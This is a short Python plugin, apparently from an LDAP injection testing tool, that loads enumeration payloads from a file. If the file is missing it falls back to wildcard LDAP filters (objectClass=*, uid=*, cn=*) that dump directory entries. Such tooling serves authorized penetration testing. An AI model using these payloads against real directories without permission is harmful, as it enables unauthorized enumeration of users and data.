import os
from ldapmap_attacker.plugins.base import BasePayload


class DataExtractionPayload(BasePayload):
    def generate(self):
        payloads = []
        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
        file_path = os.path.join(base_dir, "payloads", "enumeration.txt")

        try:
            with open(file_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        payloads.append((line, "enum", "data enum"))
        except FileNotFoundError:
            payloads = [
                ("objectClass=*", "enum", "all objclass"),
                ("uid=*", "enum", "all uid"),
                ("cn=*", "enum", "all cn"),
            ]

        return payloads
